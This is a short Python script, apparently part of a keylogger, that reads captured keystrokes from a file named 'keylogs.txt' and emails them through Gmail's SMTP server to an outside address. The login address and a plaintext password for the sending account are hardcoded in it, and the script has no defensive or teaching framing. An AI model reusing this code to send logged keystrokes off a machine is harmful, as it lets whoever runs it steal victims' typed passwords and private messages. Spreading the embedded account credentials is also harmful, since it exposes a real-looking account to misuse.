

with open('keylogs.txt') as f:
    logs = f.read()


def send_email(subject, msg):
    try:
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.ehlo()
        server.starttls()
        server.login('jonathinmakori34@gmail.com', 'Moneyman1!')
        message = 'Subject: {}\n\n{}'.format(subject, msg)
        server.sendmail('jonathinmakori34@gmail.com', 'jonathinmakori@gmail.com', message)
        server.quit()
        print("Success: ")
    except:
        print("Failed: ")


subject = "Test subject"
msg = logs

send_email(subject, msg)
